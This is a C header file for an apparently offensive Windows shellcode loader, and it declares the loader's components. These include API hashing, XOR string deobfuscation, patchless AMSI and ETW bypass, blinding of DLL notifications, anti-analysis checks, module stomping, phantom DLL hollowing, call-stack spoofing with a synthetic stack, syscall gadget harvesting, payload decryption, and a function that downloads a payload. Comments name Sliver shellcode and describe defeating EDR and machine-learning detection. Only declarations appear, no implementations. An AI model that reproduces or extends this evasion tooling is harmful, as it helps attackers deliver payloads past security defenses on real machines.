#pragma once

// =============================================
// Common Definitions, Hashes, Typedefs
// =============================================

#include <Windows.h>
#include "Structs.h"
#include "Syscalls.h"
#include "Hashes.h"
#include "Payload.h"

// ----------- Build Config -----------
// Uncomment for debug output (log file)
// #define DEBUG

// Uncomment for Go-based shellcode (Sliver) that writes to own pages.
// When defined: memory is PAGE_EXECUTE_READWRITE.
// When not defined: memory is PAGE_EXECUTE_READ (W^X).
// #define RWX_SHELLCODE

// Opt-in: #9 Draugr MVP synthetic-stack RSP swap. When defined, the
// loader allocates 1 MB and writes three fake return addresses
// pointing into ntdll/kernel32, then swaps RSP there before executing
// shellcode. Default off because (a) the 1 MB private allocation is
// itself a heuristic signal, and (b) the synthetic frames reuse
// ntdll/kernel32 .pdata which may under-match at unwind time. Enable
// only after validating with Moneta / Pe-Sieve / WinDbg stack walk.
// #define ENABLE_SYNTHETIC_STACK

// Subsystem is controlled by build.bat LFLAGS (/SUBSYSTEM:WINDOWS)

// ----------- Debug Logging -----------
#ifdef DEBUG
    VOID DbgLog(IN LPCSTR msg);
    VOID DbgLogStatus(IN LPCSTR msg, IN NTSTATUS status);
    #define LOG(msg)            DbgLog(msg)
    #define LOG_STATUS(msg, s)  DbgLogStatus(msg, s)
#else
    #define LOG(msg)
    #define LOG_STATUS(msg, s)
#endif

// Custom entry point (CRT-free, EXE mode only)
// DLL sideload builds use /ENTRY:DllMain from build.bat
#ifndef BUILD_DLL
#pragma comment(linker, "/ENTRY:Main")
#endif

// ----------- Compiler Settings (CRT-free) -----------
#pragma comment(linker, "/NODEFAULTLIB")
#pragma intrinsic(__movsb)
#pragma intrinsic(__stosb)
#pragma intrinsic(__rdtsc)

// JOAAT name hashes for syscalls and APIs live in Hashes.h (included above).

// ----------- NT Status Codes -----------
#ifndef NT_SUCCESS
#define NT_SUCCESS(Status)  ((NTSTATUS)(Status) >= 0)
#endif

#ifndef STATUS_SINGLE_STEP
#define STATUS_SINGLE_STEP  0x80000004L
#endif

// ----------- Memory Protection Helpers -----------
#ifdef RWX_SHELLCODE
    #define SHELLCODE_EXEC_PROT  PAGE_EXECUTE_READWRITE
#else
    #define SHELLCODE_EXEC_PROT  PAGE_EXECUTE_READ
#endif

// ----------- Function Typedefs -----------
typedef HMODULE (WINAPI* fnLoadLibraryA)(LPCSTR lpLibFileName);
typedef FARPROC (WINAPI* fnGetProcAddress)(HMODULE hModule, LPCSTR lpProcName);
typedef HMODULE (WINAPI* fnGetModuleHandleA)(LPCSTR lpModuleName);
typedef BOOL    (WINAPI* fnVirtualProtect)(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);

// Thread pool function typedefs (ntdll exports)
typedef NTSTATUS(NTAPI* fnTpAllocWork)(PVOID* WorkReturn, PVOID Callback, PVOID Context, PVOID CallbackEnviron);
typedef VOID    (NTAPI* fnTpPostWork)(PVOID Work);
typedef VOID    (NTAPI* fnTpReleaseWork)(PVOID Work);

// Patchless evasion typedefs (ntdll exports)
typedef PVOID   (NTAPI* fnRtlAddVectoredExceptionHandler)(ULONG First, PVOID Handler);
typedef ULONG   (NTAPI* fnRtlRemoveVectoredExceptionHandler)(PVOID Handle);
typedef VOID    (NTAPI* fnRtlCaptureContext)(PCONTEXT ContextRecord);
typedef NTSTATUS(NTAPI* fnNtContinue)(PCONTEXT ThreadContext, BOOLEAN RaiseAlert);

// Phantom DLL hollowing typedefs (ktmw32 / kernel32)
typedef HANDLE  (WINAPI* fnCreateTransaction)(LPSECURITY_ATTRIBUTES, LPGUID, DWORD, DWORD, DWORD, DWORD, LPWSTR);
typedef HANDLE  (WINAPI* fnCreateFileTransactedA)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE, HANDLE, PUSHORT, PVOID);
typedef BOOL    (WINAPI* fnRollbackTransaction)(HANDLE);
typedef BOOL    (WINAPI* fnReadFile)(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
typedef BOOL    (WINAPI* fnWriteFile2)(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED);
typedef DWORD   (WINAPI* fnSetFilePointer)(HANDLE, LONG, PLONG, DWORD);
typedef BOOL    (WINAPI* fnCloseHandle2)(HANDLE);
typedef DWORD   (WINAPI* fnGetTempPathA2)(DWORD, LPSTR);
typedef BOOL    (WINAPI* fnCopyFileA2)(LPCSTR, LPCSTR, BOOL);
typedef HANDLE  (WINAPI* fnFindFirstFileA2)(LPCSTR, LPWIN32_FIND_DATAA);
typedef BOOL    (WINAPI* fnFindNextFileA2)(HANDLE, LPWIN32_FIND_DATAA);
typedef BOOL    (WINAPI* fnFindClose2)(HANDLE);
typedef HANDLE  (WINAPI* fnCreateFileA2)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);

// ----------- Resolved WinAPI Function Pointers -----------
typedef struct _API_HASHING {
    fnLoadLibraryA      pLoadLibraryA;
    fnGetProcAddress    pGetProcAddress;
    fnGetModuleHandleA  pGetModuleHandleA;
    fnVirtualProtect    pVirtualProtect;
} API_HASHING, * PAPI_HASHING;

// ----------- CRT Replacements (intrinsics) -----------
#define MemCopy(dest, src, size)    __movsb((PBYTE)(dest), (const BYTE*)(src), (size))
#define MemSet(dest, val, size)     __stosb((PBYTE)(dest), (BYTE)(val), (size))

// ----------- String Deobfuscation (4-byte rotating XOR) -----------
// XKEY_0..XKEY_3 are defined in Payload.h (randomized per build by Encrypt.py)
static const BYTE g_XorKey[4] = { XKEY_0, XKEY_1, XKEY_2, XKEY_3 };
#define DEOBF(buf) do { for(DWORD _xi=0; (buf)[_xi]; _xi++) (buf)[_xi] ^= g_XorKey[_xi & 3]; } while(0)

// ----------- Helper Functions -----------
UINT32 HashStringJenkinsOneAtATime32BitA(IN PCHAR String);
UINT32 HashStringJenkinsOneAtATime32BitW(IN PWCHAR String);
SIZE_T StrLenA(IN LPCSTR String);
SIZE_T StrLenW(IN LPCWSTR String);
INT    StrCmpA(IN LPCSTR Str1, IN LPCSTR Str2);

// ----------- WinApi Resolution -----------
BOOL  InitializeWinApis(OUT PAPI_HASHING pApi);
PVOID FetchModuleBaseAddr(IN UINT32 dwModuleNameHash);
PVOID FetchExportAddress(IN PVOID pModuleBase, IN UINT32 dwApiNameHash);
// Validate DOS+NT signatures on a loaded module base. Returns TRUE
// and sets *ppNt on success; FALSE otherwise. *ppNt is undefined on failure.
BOOL  ValidatePeHeaders(IN PVOID pModuleBase, OUT PIMAGE_NT_HEADERS* ppNt);
// Like ValidatePeHeaders but verifies that the NT header fits within
// sBufSize bytes from pBuffer (for reading PE data off disk into a buffer).
BOOL  ValidatePeHeadersBounded(IN PVOID pBuffer, IN SIZE_T sBufSize, OUT PIMAGE_NT_HEADERS* ppNt);
// Case-insensitive PEB walk by exact upper-case BaseDllName (e.g. L"NTDLL.DLL").
PVOID FindLoadedModuleW(IN PCWSTR szUpperName);
// Fisher-Yates shuffle + LoadLibraryA on the provided DLL names. Forces the
// ETW image-load ordering to differ per run, defeating sequence-based ML
// that learns deterministic loader DLL fingerprints.
VOID  ShufflePreloadLibraries(IN PAPI_HASHING pApi, IN LPCSTR* pNames, IN DWORD dwCount);

// ----------- IAT Camouflage -----------
VOID IatCamouflage(VOID);

// ----------- Evasion -----------
BOOL BlindDllNotifications(IN PAPI_HASHING pApi);
BOOL PatchlessAmsiEtw(IN PAPI_HASHING pApi);
VOID CleanupEvasion(IN PAPI_HASHING pApi);
BOOL AntiAnalysis(VOID);
BOOL InstallExitHook(IN PVOID pNtdll);

// ----------- Module Stomping / Phantom DLL Hollowing -----------
BOOL ModuleStomp(IN PAPI_HASHING pApi, IN PBYTE pShellcode, IN DWORD dwShellcodeSize, OUT PVOID* ppExecAddr);
BOOL PhantomDllHollow(IN PAPI_HASHING pApi, IN PNTAPI_FUNC pNtApis, IN PBYTE pShellcode, IN DWORD dwShellcodeSize, OUT PVOID* ppExecAddr);

// ----------- Call Stack Spoofing (ASM) -----------
extern VOID SetSpoofTarget(PVOID pTarget, PVOID pCallGadget);
extern VOID SetSpoofStack(PVOID pSyntheticRsp);
extern VOID SpoofCallback(PVOID Instance, PVOID Context, PVOID Work);

// ----------- Synthetic Call Stack Builder (Draugr MVP) -----------
// Allocates a private 1 MB buffer and fills the top three qwords
// with RIPs inside RtlUserThreadStart / BaseThreadInitThunk /
// NtWaitForSingleObject. Returns the buffer's intended RSP (points
// at the first fake return), or NULL on failure.
PVOID BuildSyntheticStack(IN PAPI_HASHING pApi);

// ----------- Generic Gadget Pool -----------
// Holds up to 64 byte-pattern hits harvested from one or more loaded modules.
// Used by Syscalls.c (0F 05 C3 syscall;ret) and Gadgets.c (FF D3 call rbx).
#define GADGET_POOL_CAPACITY 64
typedef struct _GADGET_POOL {
    PVOID   pGadgets[GADGET_POOL_CAPACITY];
    DWORD   dwCount;
} GADGET_POOL, * PGADGET_POOL;

// Append every pPattern hit inside pModule's executable sections to pPool,
// up to GADGET_POOL_CAPACITY. Silent no-op if any arg invalid.
VOID  GadgetPoolScanModule(IN OUT PGADGET_POOL pPool, IN PVOID pModule, IN const BYTE* pPattern, IN DWORD dwPatternLen);
// RDTSC-seeded random pick. NULL if pool is empty.
PVOID GadgetPoolRandom(IN const PGADGET_POOL pPool);

// ----------- Call Gadget Discovery -----------
BOOL  CollectCallGadgets(VOID);
PVOID GetRandomCallGadget(VOID);

// ----------- Crypto -----------
BOOL ChaskeyCtrDecrypt(IN PBYTE pData, IN DWORD dwSize, IN PBYTE pKey, IN PBYTE pNonce);
BOOL DecompressPayload(IN PAPI_HASHING pApi, IN PBYTE pCompressed, IN DWORD dwCompressedSize, OUT PBYTE* ppDecompressed, IN DWORD dwOriginalSize);
BOOL BruteForceDecryption(IN BYTE HintByte, IN PBYTE pProtectedKey, IN SIZE_T sKeySize, OUT PBYTE* ppRealKey);

// ----------- Staging -----------
BOOL DownloadPayload(IN PAPI_HASHING pApi, IN LPCSTR szUrl, OUT PBYTE* ppData, OUT PDWORD pdwSize);
